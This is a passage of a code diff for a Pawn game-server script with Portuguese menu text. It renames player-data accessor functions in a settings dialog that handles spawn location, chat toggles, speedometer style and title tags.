@@ -46,31 +46,31 @@ static stock ShowPlayerConfig(playerid)
 	new configDialog[808 + 1], string[74 + 1];
 	strcat(configDialog, "{FFFFFF}Sistema\t{FFFFFF}Informações\n");
 	strcat(configDialog, "{0080ff}• {FFFFFF}Gerenciar Tags\t{848484}Clique para Configurar\n");
-	switch(PlayerData_GetSpawn(playerid))
+	switch(Player_GetSpawn(playerid))
 	{
 		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Spawn Padrão\n");
 		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Casa\n");
 		case 2: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}HQ Admin\n");
 	}
 	// Configurações de Chat
-	strcat(configDialog, (PlayerData_GetTerritorialChat(playerid) ? "{0080ff}• {FFFFFF}Mensagens Territoriais\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens Territoriais\t{f60000}Desabilitado\n"));
-	strcat(configDialog, (PlayerData_GetNoobChat(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{f60000}Desabilitado\n"));
-	strcat(configDialog, (PlayerData_GetVipChat(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{f60000}Desabilitado\n"));
-	strcat(configDialog, (PlayerData_GetSocioChat(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{f60000}Desabilitado\n"));
-	strcat(configDialog, (PlayerData_GetStreamStatus(playerid) ? "{0080ff}• {FFFFFF}Música de Interiores\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Música de Interiores\t{f60000}Desabilitado\n"));
-	strcat(configDialog, (PlayerData_GetLeaderChat(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetTerritorialChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens Territoriais\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens Territoriais\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetNoobChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetVipChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetSocioChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetMusicStreamStatus(playerid) ? "{0080ff}• {FFFFFF}Música de Interiores\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Música de Interiores\t{f60000}Desabilitado\n"));
+	strcat(configDialog, (Player_GetLeaderChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{f60000}Desabilitado\n"));
 	// 
-	switch(PlayerData_GetDocument(playerid))
+	switch(Player_GetDocument(playerid))
 	{
 		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[FORMATO MENU]\n");
 		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[TEXTO]\n");
 	}
-	switch(PlayerData_GetSpeedometer(playerid))
+	switch(Player_GetSpeedometer(playerid))
 	{
 		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Moderno\n");
 		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Compacto\n");
 	}
-	switch(PlayerData_GetTracker(playerid))
+	switch(Player_GetTracker(playerid))
 	{
 		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}CheckPoint\n");
 		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}Seta\n");
@@ -387,7 +387,7 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					}
 					case 8:
 					{
-					    if (PlayerData_GetOrgRole(playerid) != 6)
+					    if (Player_GetOrgRole(playerid) != 6)
 						{
 						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
 						}
@@ -415,7 +415,7 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					}
 					case 9:
 					{
-					    if (PlayerData_GetOrgRole(playerid) != 5)
+					    if (Player_GetOrgRole(playerid) != 5)
 						{
 						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sub-líder.");
 						}
@@ -612,12 +612,12 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
         {
             if (!response) 
             {
-                PlayerData_SetIsUsingAndroid(playerid, false);
+                Player_SetUsingAndroidStatus(playerid, false);
                 return 1;
             }
             if (response) 
             {
-                PlayerData_SetIsUsingAndroid(playerid, true);
+                Player_SetUsingAndroidStatus(playerid, true);
                 return 1;
             }
         }
@@ -638,274 +638,274 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			        {
 			            new StrCat[450];
 				        strcat(StrCat, "Título\tStatus\n");
-				        strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_NONE ? "{FFFFFF}Sem Título\t{228B22}[ON]\n" : "{FFFFFF}Sem Título\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_SCRIPTER ? "{FFFFFF}Scripter\t{228B22}[ON]\n" : "{FFFFFF}Scripter\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_ADMIN ? "{FFFFFF}Administrador\t{228B22}[ON]\n" : "{FFFFFF}Administrador\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_LEADER ? "{FFFFFF}Líder\t{228B22}[ON]\n" : "{FFFFFF}Líder\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_SUBLEADER ? "{FFFFFF}SubLíder\t{228B22}[ON]\n" : "{FFFFFF}SubLíder\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_VIP ? "{FFFFFF}Membro Vip\t{228B22}[ON]\n" : "{FFFFFF}Membro Vip\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_SOCIO ? "{FFFFFF}Membro Sócio\t{228B22}[ON]\n" : "{FFFFFF}Membro Sócio\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_NOOB ? "{FFFFFF}Noob\t{228B22}[ON]\n" : "{FFFFFF}Noob\t{FF0000}[OFF]\n"));
-						strcat(StrCat, (PlayerData_GetTag(playerid) == TAG_KILLER ? "{FFFFFF}Matador\t{228B22}[ON]\n" : "{FFFFFF}Matador\t{FF0000}[OFF]\n"));
+				        strcat(StrCat, (Player_GetTag(playerid) == NO_TAG ? "{FFFFFF}Sem Título\t{228B22}[ON]\n" : "{FFFFFF}Sem Título\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_SCRIPTER ? "{FFFFFF}Scripter\t{228B22}[ON]\n" : "{FFFFFF}Scripter\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_ADMIN ? "{FFFFFF}Administrador\t{228B22}[ON]\n" : "{FFFFFF}Administrador\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_LEADER ? "{FFFFFF}Líder\t{228B22}[ON]\n" : "{FFFFFF}Líder\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_SUBLEADER ? "{FFFFFF}SubLíder\t{228B22}[ON]\n" : "{FFFFFF}SubLíder\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_VIP ? "{FFFFFF}Membro Vip\t{228B22}[ON]\n" : "{FFFFFF}Membro Vip\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_SOCIO ? "{FFFFFF}Membro Sócio\t{228B22}[ON]\n" : "{FFFFFF}Membro Sócio\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_NOOB ? "{FFFFFF}Noob\t{228B22}[ON]\n" : "{FFFFFF}Noob\t{FF0000}[OFF]\n"));
+						strcat(StrCat, (Player_GetTag(playerid) == TAG_KILLER ? "{FFFFFF}Matador\t{228B22}[ON]\n" : "{FFFFFF}Matador\t{FF0000}[OFF]\n"));
 				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						ShowPlayerDialog(playerid, DIALOG_MANAGE_TAG, DIALOG_STYLE_TABLIST_HEADERS, "Gerenciar Títulos", StrCat, "Trocar", "Voltar");
 			        }
 			        case 1:
 			        {
-			            switch(PlayerData_GetSpawn(playerid))
+			            switch(Player_GetSpawn(playerid))
 						{
 							case 0: 
 							{
-								if (PlayerData_GetAdmin(playerid) > HELPER)
+								if (Player_GetAdminLevel(playerid) > HELPER)
 								{
-									PlayerData_SetSpawn(playerid, 2);
+									Player_SetSpawn(playerid, 2);
 									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
-									Player_UpdateAutoConfigTypes(playerid);
+									Player_UpdateConfigData(playerid);
 									return ShowPlayerConfig(playerid);
 								}
 								else
 								{
-									PlayerData_SetSpawn(playerid, 0);
+									Player_SetSpawn(playerid, 0);
 									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 									SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa para alterar o local de nascimento.");
-									Player_UpdateAutoConfigTypes(playerid);
+									Player_UpdateConfigData(playerid);
 									return ShowPlayerConfig(playerid);
 								}
 							}
 							case 1: 
 							{ 
-								if (PlayerData_GetAdmin(playerid) > HELPER) 
+								if (Player_GetAdminLevel(playerid) > HELPER) 
 								{
-									PlayerData_SetSpawn(playerid, 2);
+									Player_SetSpawn(playerid, 2);
 									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
-									Player_UpdateAutoConfigTypes(playerid);
+									Player_UpdateConfigData(playerid);
 									return ShowPlayerConfig(playerid);
 								}
 								else 
 								{
-									PlayerData_SetSpawn(playerid, 0);
+									Player_SetSpawn(playerid, 0);
 									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
-									Player_UpdateAutoConfigTypes(playerid);
+									Player_UpdateConfigData(playerid);
 									return ShowPlayerConfig(playerid);
 								}
 							}
 							case 2:
 							{
-								PlayerData_SetSpawn(playerid, 0);
+								Player_SetSpawn(playerid, 0);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 2:
 			        {
-			            switch(PlayerData_GetTerritorialChat(playerid))
+			            switch(Player_GetTerritorialChatStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetTerritorialChat(playerid, true);
+								Player_SetTerritorialChatStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou as mensagens territoriais.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetTerritorialChat(playerid, false);
+								Player_SetTerritorialChatStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou as mensagens territoriais.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 			        case 3:
 			        {
-			            switch(PlayerData_GetNoobChat(playerid))
+			            switch(Player_GetNoobChatStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetNoobChat(playerid, true);
+								Player_SetNoobChatStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat de duvidas.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetNoobChat(playerid, false);
+								Player_SetNoobChatStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat de duvidas.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 4:
 			        {
-			            switch(PlayerData_GetVipChat(playerid))
+			            switch(Player_GetVipChatStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetVipChat(playerid, true);
+								Player_SetVipChatStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat vip.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetVipChat(playerid, false);
+								Player_SetVipChatStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat vip.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 5:
 			        {
-			            switch(PlayerData_GetSocioChat(playerid))
+			            switch(Player_GetSocioChatStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetSocioChat(playerid, true);
+								Player_SetSocioChatStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat socio.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetSocioChat(playerid, false);
+								Player_SetSocioChatStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat socio.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 6:
 			        {
-			            switch(PlayerData_GetStreamStatus(playerid))
+			            switch(Player_GetMusicStreamStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetStreamStatus(playerid, true);
+								Player_SetMusicStreamStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou as musicas em interiores.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetStreamStatus(playerid, false);
+								Player_SetMusicStreamStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou as musicas em interiores.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 7:
 			        {
-						if (PlayerData_GetOrgRole(playerid) != 6)
+						if (Player_GetOrgRole(playerid) != 6)
 						{
 							return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder");
 						}
-			            switch(PlayerData_GetLeaderChat(playerid))
+			            switch(Player_GetLeaderChatStatus(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetLeaderChat(playerid, true);
+								Player_SetLeaderChatStatus(playerid, true);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat lider.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetLeaderChat(playerid, false);
+								Player_SetLeaderChatStatus(playerid, false);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat lider.");
-								Player_UpdateAutoConfigChats(playerid);
+								Player_UpdateConfigChatsData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 8:
 			        {
-			            switch(PlayerData_GetDocument(playerid))
+			            switch(Player_GetDocument(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetDocument(playerid, 1);
+								Player_SetDocument(playerid, 1);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato texto.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetDocument(playerid, 0);
+								Player_SetDocument(playerid, 0);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato menu.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 9:
 			        {
-			            switch(PlayerData_GetSpeedometer(playerid))
+			            switch(Player_GetSpeedometer(playerid))
 						{
 							case 0: 
 							{
 								// new vid = GetPlayerVehicleID(playerid);
 								// if (IsPlayerInVehicle(playerid, vid)) HidePlayerVelocimetro(playerid);
-								PlayerData_SetSpeedometer(playerid, 1);
+								Player_SetSpeedometer(playerid, 1);
 								// if (IsPlayerInVehicle(playerid, vid)) ShowPlayerVelocimetro(playerid);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo compacto.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
 								// new vid = GetPlayerVehicleID(playerid);
 								// if (IsPlayerInVehicle(playerid, vid)) HidePlayerVelocimetro(playerid);
-								PlayerData_SetSpeedometer(playerid, 0);
+								Player_SetSpeedometer(playerid, 0);
 								// if (IsPlayerInVehicle(playerid, vid)) ShowPlayerVelocimetro(playerid);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo moderno.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
 			        }
 					case 10:
 			        {
-			            switch(PlayerData_GetTracker(playerid))
+			            switch(Player_GetTracker(playerid))
 						{
 							case 0: 
 							{
-								PlayerData_SetTracker(playerid, 1);
+								Player_SetTracker(playerid, 1);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para seta.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 							default: 
 							{
-								PlayerData_SetTracker(playerid, 0);
+								Player_SetTracker(playerid, 0);
 								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para checkpoint.");
-								Player_UpdateAutoConfigTypes(playerid);
+								Player_UpdateConfigData(playerid);
 								return ShowPlayerConfig(playerid);
 							}
 						}
@@ -913,10 +913,10 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					case 11:
 			        {
 						new hitDialog[228 + 1];
-			            strcat(hitDialog, (PlayerData_GetHitSound(playerid) == 3 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n"));
-						strcat(hitDialog, (PlayerData_GetHitSound(playerid) == 2 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n"));
-						strcat(hitDialog, (PlayerData_GetHitSound(playerid) == 1 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n"));
-						strcat(hitDialog, (PlayerData_GetHitSound(playerid) == 0 ? "{04b404}» {f60000}(Desativar barulho do sino)\n" : "{f60000}(Desativar barulho do sino)\n"));
+			            strcat(hitDialog, (Player_GetHitSound(playerid) == 3 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n"));
+						strcat(hitDialog, (Player_GetHitSound(playerid) == 2 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n"));
+						strcat(hitDialog, (Player_GetHitSound(playerid) == 1 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n"));
+						strcat(hitDialog, (Player_GetHitSound(playerid) == 0 ? "{04b404}» {f60000}(Desativar barulho do sino)\n" : "{f60000}(Desativar barulho do sino)\n"));
 			        	PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						ShowPlayerDialog(playerid, DIALOG_MENU_HIT, DIALOG_STYLE_LIST, "Menu Hit", hitDialog, "Escolher", "Voltar");
 					}
@@ -933,34 +933,34 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				{
 					case 0:
 					{
-						PlayerData_SetHitSound(playerid, 3);
+						Player_SetHitSound(playerid, 3);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar Tiro).");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 						return ShowPlayerConfig(playerid);
 					}
 					case 1:
 					{
-						PlayerData_SetHitSound(playerid, 2);
+						Player_SetHitSound(playerid, 2);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Levar Tiro).");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 						return ShowPlayerConfig(playerid);
 					}
 					case 2:
 					{
-						PlayerData_SetHitSound(playerid, 1);
+						Player_SetHitSound(playerid, 1);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar & Levar Tiro).");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 						return ShowPlayerConfig(playerid);
 					}
 					case 3:
 					{
-						PlayerData_SetHitSound(playerid, 0);
+						Player_SetHitSound(playerid, 0);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você desativou o barulho do sino.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 						return ShowPlayerConfig(playerid);
 					}
 				}
@@ -978,98 +978,98 @@ hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			    {
 			        case 0:
 			        {
-			            PlayerData_SetTag(playerid, TAG_NONE);
+			            Player_SetTag(playerid, NO_TAG);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 			            SendClientMessage(playerid, COLOR_YELLOW, "Você removeu o seu título.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 1:
 			        {
-			            if (PlayerData_GetAdmin(playerid) != OWNER)
+			            if (Player_GetAdminLevel(playerid) != OWNER)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é o scripter do servidor.");
 			            }
-						PlayerData_SetTag(playerid, TAG_SCRIPTER);
+						Player_SetTag(playerid, TAG_SCRIPTER);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Scripter'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 2:
 			        {
-			            if (PlayerData_GetAdmin(playerid) < HELPER)
+			            if (Player_GetAdminLevel(playerid) < HELPER)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um administrador.");
 			            }
-						PlayerData_SetTag(playerid, TAG_ADMIN);
+						Player_SetTag(playerid, TAG_ADMIN);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Administrador'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 3:
 			        {
-			            if (PlayerData_GetOrgRole(playerid) != 6 || PlayerData_GetOrg(playerid) == INVALID_VALUE)
+			            if (Player_GetOrgRole(playerid) != 6 || Player_GetOrg(playerid) == INVALID_VALUE)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
 			            }
-						PlayerData_SetTag(playerid, TAG_LEADER);
+						Player_SetTag(playerid, TAG_LEADER);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Lider'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 4:
 			        {
-			            if (PlayerData_GetOrgRole(playerid) != 5 || PlayerData_GetOrg(playerid) == INVALID_VALUE)
+			            if (Player_GetOrgRole(playerid) != 5 || Player_GetOrg(playerid) == INVALID_VALUE)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sublíder.");
 			            }
-						PlayerData_SetTag(playerid, TAG_SUBLEADER);
+						Player_SetTag(playerid, TAG_SUBLEADER);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'SubLider'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 5:
 			        {
-			            if (PlayerData_GetVip(playerid) < 1)
+			            if (Player_GetVipLevel(playerid) < 1)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro vip.");
 			            }
-						PlayerData_SetTag(playerid, TAG_VIP);
+						Player_SetTag(playerid, TAG_VIP);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Vip'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 					case 6:
 			        {
-			            if (PlayerData_GetSocio(playerid) < 1)
+			            if (Player_GetSocioLevel(playerid) < 1)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro sócio.");
 			            }
-						PlayerData_SetTag(playerid, TAG_SOCIO);
+						Player_SetTag(playerid, TAG_SOCIO);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Sócio'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 	                case 7:
 			        {
-			            if (PlayerData_GetDeaths(playerid) < 400)
+			            if (Player_GetDeaths(playerid) < 400)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não morreu o suficiente.");
 			            }
-						PlayerData_SetTag(playerid, TAG_NOOB);
